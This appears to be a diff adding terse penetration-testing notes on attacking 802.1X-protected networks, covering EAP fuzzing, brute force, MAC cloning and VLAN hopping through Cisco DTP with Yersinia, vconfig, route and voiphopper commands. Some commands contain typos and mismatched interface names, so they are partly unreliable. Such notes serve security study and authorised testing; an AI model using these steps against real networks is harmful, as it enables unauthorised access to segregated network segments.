@@ -1,1 +1,45 @@
+802.1x Attacks
+-------------------
+
+Only after authentication through EAP you receive access to network. 
+
+1. Fuzz EAP server as switch is agnostic to it 
+2. Brute Force
+3. Social Engineering 
+
+
+POST Authentication 
+1. Shadow device by cloning MAC 
+2. VLAN Hop 
+
+
+Linux OS only supports truking, windows doesnt recognize trunking packets. 
+VLAN hopping done by manipulating 802.1q packets, if detected switch will send VLAN infomration to our device through DTP. 
+
+DTP is proprietary to CISCO switches. Juniper has similar attacks. 
+
+Tool: 
+Step 1. Yersinia -I -> g -> DTP -> x -> 1 
+Step 2. If attack successful -> 5 (status dialog) -> "84 TRUNK/AUTO" (successful)
+Step 3. Press g -> select protocol mode -> 802.1q -> enter 
+Yersinia shows VLAN List 
+
+VLAN Participation : 
+modrpobe 8021q
+vconfig add eth0 101
+ifconfig eth0.100 
+vconfig rem eth0.100 (removes) 
+
+add route : route add -net 0.0.0.0/0 eth0.100 
+proceed to scan 
+
+also bruteforce VLAN with vconfig, dhclient (bash script) 
+Also to access VoIP VLAN - through Cisco Discovery Protocols 
+voiphopper -c 0 -i eth0
+
+
+
+
+
+
 
